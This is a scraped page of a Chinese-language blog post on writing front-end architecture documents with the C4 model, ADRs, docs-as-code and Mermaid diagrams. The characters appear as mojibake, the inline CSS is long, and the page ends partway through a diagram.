                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9910c3f857e94b12975be141f221e053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444584&amp;x-signature=J1T3Vof51RX1ZDdJ3eZOTpTNT3Q%3D" alt="Gemini_Generated_Image_awm4poawm4poawm4.png" loading="lazy"/></p>
<h3 data-id="heading-0">å¼•è¨€ï¼šæ¶æ„å¸ˆçš„â€œèº«åäº‹â€</h3>
<ul>
<li><strong>ç—›ç‚¹ç›´å‡»</strong>ï¼šä½ æ˜¯å¦é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼Ÿæ–°é¡¹ç›®å¯åŠ¨æ—¶å†™äº†å‡ åé¡µ æ–‡æ¡£ (æ‰“ä¸ªæ¯”æ–¹) ï¼Œä¸‰ä¸ªæœˆåä»£ç æ”¹å¾—é¢ç›®å…¨éï¼Œæ–‡æ¡£å´å†ä¹Ÿæ²¡äººæ‰“å¼€è¿‡ã€‚</li>
<li><strong>æ ¸å¿ƒå†²çª</strong>ï¼šä»£ç æ˜¯å†™ç»™æœºå™¨çœ‹çš„ï¼ˆè¿½æ±‚å‡†ç¡®ï¼‰ï¼Œæ–‡æ¡£æ˜¯å†™ç»™<strong>æœªæ¥çš„å›¢é˜Ÿ</strong>çœ‹çš„ï¼ˆè¿½æ±‚ç†è§£ï¼‰ã€‚</li>
<li><strong>è§‚ç‚¹æŠ›å‡º</strong>ï¼šä¸€ä»½å¥½çš„æ¶æ„æ–‡æ¡£ï¼ˆADD - Architecture Design Documentï¼‰ä¸æ˜¯ç¹æ–‡ç¼›èŠ‚ï¼Œå®ƒæ˜¯å›¢é˜Ÿåä½œçš„â€œå¥‘çº¦â€å’ŒæŠ€æœ¯å†³ç­–çš„â€œé»‘åŒ£å­â€ã€‚</li>
</ul>
<h3 data-id="heading-1">1. æ³•åˆ™ä¸€ï¼šå‡ç»´æ€è€ƒ â€”â€” å¼•å…¥ C4 æ¨¡å‹</h3>
<p><em>ä¸Šä¸€ç¯‡æˆ‘ä»¬è®²äº† UMLï¼ˆå¾®è§‚çš„ç”»ç¬”ï¼‰ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬è¦è®²å®è§‚çš„åœ°å›¾ã€‚</em></p>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆè¦å¼•å…¥ C4ï¼Ÿ</strong></p>
<ul>
<li>ä¼ ç»Ÿçš„ 4+1 è§†å›¾å¯¹æ•æ·å¼€å‘æ¥è¯´æœ‰æ—¶è¿‡äºåšé‡ã€‚</li>
<li><strong>C4 æ¨¡å‹</strong> (Context, Containers, Components, Code) åƒ Google Maps ä¸€æ ·ï¼Œæä¾›äº†ä»â€œå…¨çƒâ€åˆ°â€œè¡—é“â€çš„ 4 ä¸ªç¼©æ”¾çº§åˆ«ï¼Œæ›´é€‚åˆç°ä»£ Web åº”ç”¨ã€‚</li>
</ul>
</li>
<li>
<p><strong>å‰ç«¯è§†è§’çš„ C4 æ‹†è§£ï¼ˆå›¾æ–‡ç»“åˆï¼‰ï¼š</strong></p>
<ul>
<li><strong>Level 1: System Context (ç³»ç»Ÿä¸Šä¸‹æ–‡)</strong> ï¼š</li>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼šä½ çš„ Web App å’Œå¤–éƒ¨ç³»ç»Ÿï¼ˆæ”¯ä»˜ç½‘å…³ã€è€åç«¯ã€CDNï¼‰çš„å…³ç³»ã€‚</li>
<li><em>ç»™è°çœ‹</em>ï¼šéæŠ€æœ¯äººå‘˜ã€äº§å“ç»ç†ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
  A[ç”µå•†å‰ç«¯] --&gt;|HTTPS| B[æ”¯ä»˜ç½‘å…³]
  A --&gt;|WebSocket| C[å®æ—¶æ¨èæœåŠ¡]
  D[è€åç«¯] --&gt;|REST| A
  E[CDN] --&gt;|é™æ€èµ„æº| A
</code></pre>
<ul>
<li>
<p><strong>Level 2: Containers (å®¹å™¨)</strong> ï¼š</p>
<ul>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼š<strong>è¿™æ˜¯å‰ç«¯æ¶æ„å¸ˆçš„ä¸»æˆ˜åœº</strong>ã€‚SPA å®¢æˆ·ç«¯ã€BFF å±‚ (Node.js)ã€å¾®å‰ç«¯å­åº”ç”¨ã€ç§»åŠ¨ç«¯ WebViewã€‚</li>
<li><em>ç»™è°çœ‹</em>ï¼šå¼€å‘å›¢é˜Ÿã€è¿ç»´ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
  subgraph å‰ç«¯æ¶æ„
    A[SPAå®¢æˆ·ç«¯] --&gt;|GraphQL| B[BFFå±‚]
    B --&gt;|RPC| C[å¾®å‰ç«¯å­åº”ç”¨]
    D[ç§»åŠ¨ç«¯WebView] --&gt;|REST| B
  end
</code></pre>
<ul>
<li>
<p><strong>Level 3: Components (ç»„ä»¶)</strong> ï¼š</p>
<ul>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼šä¸æ˜¯ React UI ç»„ä»¶ï¼Œæ˜¯<strong>ä¸šåŠ¡åŠŸèƒ½æ¨¡å—</strong>ï¼ˆå¦‚ï¼šè´­ç‰©è½¦æ§åˆ¶å™¨ã€èº«ä»½è®¤è¯æœåŠ¡ã€æ—¥å¿—æ¨¡å—ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
  A[è´­ç‰©è½¦æ§åˆ¶å™¨] --&gt;|äº‹ä»¶æ€»çº¿| B[åº“å­˜æ ¡éªŒæœåŠ¡]
  A --&gt;|LocalStorage| C[æœ¬åœ°ç¼“å­˜]
  D[èº«ä»½è®¤è¯æ¨¡å—] --&gt;|JWT| E[APIç½‘å…³]
</code></pre>
<ul>
<li>
<p><strong>Level 4: Code (ä»£ç )</strong> ï¼š</p>
<ul>
<li><em>è§‚ç‚¹</em>ï¼š<strong>ä¸è¦ç”»ï¼</strong> ä»£ç å˜åŒ–å¤ªå¿«ï¼Œå›¾é€šè¿‡ IDE è‡ªåŠ¨ç”Ÿæˆå³å¯ï¼Œç”»äº†å¿…æ­»ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">2. æ³•åˆ™äºŒï¼šå†³ç­–ç•™ç—• â€”â€” æ¶æ„å†³ç­–è®°å½• (ADR)</h3>
<p><em>è¿™æ˜¯æœ¬æ–‡æœ€â€œç¡¬æ ¸â€ã€æœ€èƒ½ä½“ç°æ¶æ„å¸ˆä»·å€¼çš„éƒ¨åˆ†ã€‚</em></p>
<ul>
<li>
<p><strong>ä»€ä¹ˆæ˜¯ ADRï¼Ÿ</strong></p>
<ul>
<li>æ–‡æ¡£ä¸ä»…è¦è®°å½•â€œç”±äºä»€ä¹ˆï¼ˆResultï¼‰â€ï¼Œæ›´è¦è®°å½•â€œä¸ºä»€ä¹ˆï¼ˆWhyï¼‰â€ã€‚</li>
<li>å¾ˆå¤šæ—¶å€™ï¼Œæ–°åŒäº‹éª‚ä»£ç çƒ‚ï¼Œæ˜¯å› ä¸ºä»–ä»¬ä¸çŸ¥é“å½“å¹´çš„<strong>çº¦æŸæ¡ä»¶</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ADR æ ‡å‡†æ¨¡æ¿ï¼ˆç›´æ¥ç»™å¹²è´§ï¼‰ï¼š</strong></p>
<ul>
<li>
<p><strong>æ ‡é¢˜</strong>ï¼šADR-001 é‡‡ç”¨ Tailwind CSS æ›¿ä»£ Styled-components</p>
</li>
<li>
<p><strong>çŠ¶æ€</strong>ï¼šå·²é€šè¿‡ / å·²åºŸå¼ƒ / æè®®ä¸­</p>
</li>
<li>
<p><strong>èƒŒæ™¯ (Context)</strong> ï¼šç°æœ‰ CSS-in-JS æ–¹æ¡ˆå¯¼è‡´ Bundle ä½“ç§¯è¿‡å¤§ï¼Œä¸”å›¢é˜Ÿå‘½åå›°éš¾ã€‚</p>
</li>
<li>
<p><strong>å†³ç­– (Decision)</strong> ï¼šå…¨çº¿å¼•å…¥ Tailwind CSSã€‚</p>
</li>
<li>
<p><strong>åæœ (Consequences)</strong> ï¼š</p>
<ul>
<li>(+) è¿™é‡Œçš„ HTML ä¼šå˜ä¸‘ã€‚</li>
<li>(+) æ ·å¼æ–‡ä»¶ä½“ç§¯å‡å°‘ 40%ã€‚</li>
<li>(-) éœ€è¦ç»Ÿä¸€é…ç½® ESLint æ’ä»¶è¿›è¡Œç±»åæ’åºã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>ä¸è¦æŠŠ ADR å†™åœ¨ Word é‡Œï¼Œè¦æ”¾åœ¨ä»£ç ä»“åº“çš„ <code>/docs/adr</code> ç›®å½•ä¸‹ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">3. æ³•åˆ™ä¸‰ï¼šæ–‡æ¡£å³ä»£ç  (Docs as Code)</h3>
<p><em>å¦‚ä½•ä¿è¯æ–‡æ¡£â€œæ´»ç€â€ï¼Ÿè®©å®ƒå’Œä»£ç ä½åœ¨ä¸€èµ·ã€‚</em></p>
<ul>
<li>
<p><strong>å·¥å…·é“¾æ¨è</strong>ï¼š</p>
<ul>
<li><strong>å­˜å‚¨</strong>ï¼šGit ä»“åº“ï¼ˆä¸ <code>package.json</code> åŒçº§ï¼‰ã€‚</li>
<li><strong>ç¼–å†™</strong>ï¼šMarkdownã€‚</li>
<li><strong>ç”»å›¾</strong>ï¼šMermaidï¼ˆç›´æ¥åœ¨ Markdown é‡Œå†™ä»£ç ç”Ÿæˆå›¾ï¼Œä¾¿äº Git Diff å¯¹æ¯”ä¿®æ”¹ï¼‰ã€‚</li>
<li><strong>å‘å¸ƒ</strong>ï¼šVitePress / Docusaurusï¼ˆè‡ªåŠ¨æ„å»ºæˆé™æ€ç«™ç‚¹ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç›®å½•ç»“æ„ç¤ºä¾‹</strong>ï¼š</p>
</li>
</ul>
<h3 data-id="heading-4">4. è½åœ°æ¨¡æ¿ï¼šä¸€ä»½â€œä¸è¢«å«Œå¼ƒâ€çš„æ¶æ„æ–‡æ¡£éª¨æ¶</h3>
<ol>
<li>
<p><strong>èƒŒæ™¯ä¸ç›®æ ‡</strong> (1å¥è¯è¯´æ˜é¡¹ç›®ä»·å€¼)</p>
<ul>
<li><strong>[ç—›ç‚¹/ç°çŠ¶]</strong> + <strong>[è§£å†³æ–¹æ¡ˆ]</strong> + <strong>[é‡åŒ–ä»·å€¼]</strong></li>
<li>ç¤ºä¾‹ :  â€œæ‰“é€ ä¼ä¸šçº§å‰ç«¯å¾®æœåŠ¡åŸºåº§ï¼Œé€šè¿‡<strong>å¾®å‰ç«¯æ¶æ„</strong>è§£è€¦å·¨çŸ³åº”ç”¨ï¼Œå®ç°å¤šå›¢é˜Ÿç‹¬ç«‹éƒ¨ç½²ï¼Œå¹¶ç»Ÿä¸€å…¨çº¿äº§å“çš„ UI äº¤äº’ä½“éªŒä¸é‰´æƒé€»è¾‘ã€‚â€</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b2e83a5ef24c52b84a927a127deb15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444584&amp;x-signature=e74DRIcI1ti5rnlXOwvT%2FMMWVwY%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>çº¦æŸæ¡ä»¶</strong> (å¿…é¡»å…¼å®¹ IEï¼Ÿå¿…é¡» 2 å‘¨ä¸Šçº¿ï¼Ÿ)</p>
<ul>
<li>æ ¹æ®å†…éƒ¨è‡ªå®šä¹‰</li>
</ul>
</li>
<li>
<p><strong>ç³»ç»Ÿæ¶æ„å›¾</strong> (ç¤ºä¾‹)</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
%% é‡æ„ç±»é¡¹ç›®
P1["è€æ—§ç³»ç»Ÿ"] --&gt; 
S1["æŠ€æœ¯å‡çº§&lt;br/&gt;React 18 + Vite"] --&gt; 
V1["æ€§èƒ½æå‡&lt;br/&gt;ç»´æŠ¤æˆæœ¬é™ä½"]

%% é«˜å¹¶å‘é¡¹ç›®
P2["CSRç“¶é¢ˆ"] --&gt; 
S2["SSRæ¸²æŸ“&lt;br/&gt;CDNåˆ†å‘"] --&gt; 
V2["SEOä¼˜åŒ–&lt;br/&gt;è½¬åŒ–ç‡æå‡"]

%% ä¸­å°é¡¹ç›®
P3["å·¨çŸ³åº”ç”¨"] --&gt; 
S3["å¾®å‰ç«¯&lt;br/&gt;æ¨¡å—è§£è€¦"] --&gt; 
V3["ç‹¬ç«‹éƒ¨ç½²&lt;br/&gt;å›¢é˜Ÿåä½œä¼˜åŒ–"]

%% æ ·å¼
classDef pStyle fill:#ffebee,stroke:#f44336,color:#b71c1c
classDef sStyle fill:#e3f2fd,stroke:#2196f3,color:#0d47a1
classDef vStyle fill:#e8f5e9,stroke:#4caf50,color:#1b5e20

class P1,P2,P3 pStyle
class S1,S2,S3 sStyle
class V1,V2,V3 vStyle
</code></pre>
</li>
<li>
<p><strong>å…³é”®æŠ€æœ¯é€‰å‹</strong> (é“¾æ¥åˆ°å…·ä½“çš„ ADR æ–‡ä»¶)</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
%% æŠ€æœ¯åˆ†ç±»
æ¡†æ¶é€‰å‹ --&gt; React
æ„å»ºå·¥å…· --&gt; Vite
æ¸²æŸ“æ¨¡å¼ --&gt; NextJS
æ¶æ„æ–¹æ¡ˆ --&gt; Qiankun

%% å…·ä½“æŠ€æœ¯
React["React 18"] --&gt; ADR1[" ADR-001"]
Vite["Vite 5.x"] --&gt; ADR2["ADR-002"]
NextJS[" Next.js SSR"] --&gt; ADR3[" ADR-003"]
Qiankun[" qiankun"] --&gt; ADR4[" ADR-004"]

%% æ›¿ä»£è¯´æ˜
React -.-&gt;|æ›¿ä»£ jQuery| Legacy1
Vite -.-&gt;|æ›¿ä»£ Webpack| Legacy2
NextJS -.-&gt;|ä¼˜åŒ–é¦–å±| Target1["FCP &lt; 1.5s"]
Qiankun -.-&gt;|å¾®å‰ç«¯åŸºåº§| Target2["æ¨¡å—è§£è€¦"]

%% æ ·å¼
classDef cat fill:#f5f5f5,stroke:#616161,font-weight:bold
classDef tech fill:#bbdefb,stroke:#1976d2,color:#0d47a1
classDef adr fill:#c8e6c9,stroke:#388e3c,color:#1b5e20

class æ¡†æ¶é€‰å‹,æ„å»ºå·¥å…·,æ¸²æŸ“æ¨¡å¼,æ¶æ„æ–¹æ¡ˆ cat
class React,Vite,NextJS,Qiankun tech
class ADR1,ADR2,ADR3,ADR4 adr
</code></pre>
</li>
<li>
<p><strong>éåŠŸèƒ½æ€§éœ€æ±‚</strong> (NFRs)</p>
<ul>
<li><em>æ€§èƒ½</em>ï¼šFCP &lt; 1.5s</li>
<li><em>å®‰å…¨</em>ï¼šXSS é˜²æŠ¤ç­–ç•¥</li>
<li><em>ç›‘æ§</em>ï¼šSentry æŠ¥è­¦è§„åˆ™</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    %% æ ¹èŠ‚ç‚¹
    NFRs["éåŠŸèƒ½æ€§éœ€æ±‚"] --&gt; Perf
    NFRs --&gt; Sec
    NFRs --&gt; Mon

    %% æ€§èƒ½éœ€æ±‚
    Perf["æ€§èƒ½éœ€æ±‚&lt;br/&gt;Performance"] --&gt; P1["é¦–å±&lt;1.5s"]
    Perf --&gt; P2["äº¤äº’&lt;100ms"]
    Perf --&gt; P3["èµ„æºä¼˜åŒ–"]

    %% å®‰å…¨éœ€æ±‚
    Sec["å®‰å…¨éœ€æ±‚&lt;br/&gt;Security"] --&gt; S1["XSSé˜²æŠ¤"]
    Sec --&gt; S2["CSRFé˜²æŠ¤"]
    Sec --&gt; S3["æ•°æ®åŠ å¯†"]

    %% ç›‘æ§éœ€æ±‚
    Mon["ç›‘æ§éœ€æ±‚&lt;br/&gt;Monitoring"] --&gt; M1["é”™è¯¯ç‡&lt;0.1%"]
    Mon --&gt; M2["æ€§èƒ½å‘Šè­¦"]
